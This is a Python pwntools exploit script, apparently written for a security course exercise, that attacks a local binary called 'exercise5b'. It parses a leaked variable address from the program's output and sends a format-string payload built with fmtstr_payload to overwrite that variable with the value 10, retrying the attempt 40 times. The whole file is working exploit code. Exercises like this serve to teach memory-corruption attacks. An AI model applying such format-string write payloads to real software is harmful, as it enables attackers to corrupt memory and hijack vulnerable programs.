#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise5b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def read_vals(read):
    regex = r"n (\S*) &n (\S*)"
    res = re.findall(regex, read)
    if len(res) != 1:
        raise Exception(f"Found not exactly one {res}")
    return res[0]
    
def exploit():
    r = start()

    # You can now communicate with the process, e.g.,
    # r.sendline("AAAAA")
    # r.recvline()
    n_val, n_add = read_vals(r.recvline().decode())
    n_add = int(n_add, 16)
    print(f"got {n_val} and {hex(n_add)}")
    # write into n 10 using the non used printf
    writes = {n_add: 10}
    offset = 10
    payload = b"1A" + fmtstr_payload(offset, writes, numbwritten=2, offset_bytes=2)
    assert len(payload) <= 128
    print(payload)
    r.sendline(payload)
    #r.interactive()
    r.recvuntil(b" &n ") # get rid of garbage
    print(r.recvall(timeout=.1).decode())


for i in range(40):
    try:
        exploit()
    except:
        pass
